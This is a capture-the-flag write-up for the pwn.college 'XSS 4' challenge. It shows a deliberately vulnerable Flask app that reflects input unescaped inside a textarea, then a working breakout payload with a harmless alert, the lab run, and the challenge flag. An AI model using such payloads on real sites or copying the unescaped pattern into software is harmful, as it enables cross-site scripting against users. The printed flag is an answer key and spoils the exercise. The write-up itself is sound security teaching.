---
layout: page
title: "🛡️ XSS 4 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 📁 Challenge Information

- **Category**: Web Exploitation
- **Challenge Name**: XSS 4
- **Platform**: pwn.college
- **Tags**: `XSS`, `Reflected`, `Textarea Injection`, `Script Injection`, `JavaScript`, `DOM`

---

## 🔍 Description

We are given a Flask web app that displays a message entered in a `<textarea>` tag through the `msg` query parameter. Our goal is to inject JavaScript into the rendered HTML page and trigger an alert box to capture the flag.

---

## 📜 Source Code

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        <form>
            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

---

## 🧠 Vulnerability Analysis

The key vulnerability here lies in the way user input is directly embedded inside a `<textarea>` tag **without any sanitization or escaping**:

```html
<textarea name=msg>{user-controlled-input}</textarea>
```

This allows us to **break out** of the `</textarea>` context and inject our own HTML/JavaScript content.

---

## 🎯 Exploit

By closing the existing `<textarea>` tag and inserting a `<script>` block, we can execute arbitrary JavaScript code in the victim’s browser.

### ✅ Payload:

```html
</textarea><script>alert("PWNED")</script><textarea>
```

### 🔗 Full URL:

```
http://challenge.localhost/?msg=</textarea><script>alert("PWNED")</script><textarea>
```

---

## 🚀 Execution

We use the `/challenge/victim` command to simulate a visit by a vulnerable user or bot:

```bash
hacker@web-security~xss-4:~$ /challenge/victim 'http://challenge.localhost/?msg=</textarea><script>alert("PWNED")</script><textarea>'
```

This results in:

```text
Visiting http://challenge.localhost/?msg=</textarea><script>alert("PWNED")</script><textarea>
Alert triggered! Your reward:
pwn.college{Ysj7zmjBRnYiY7FcGZ1v35gxDuU.QX1kzMzwSM0IzMyEzW}
```

---

## 🏁 Flag

```
pwn.college{Ysj7zmjBRnYiY7FcGZ1v35gxDuU.QX1kzMzwSM0IzMyEzW}
```

---

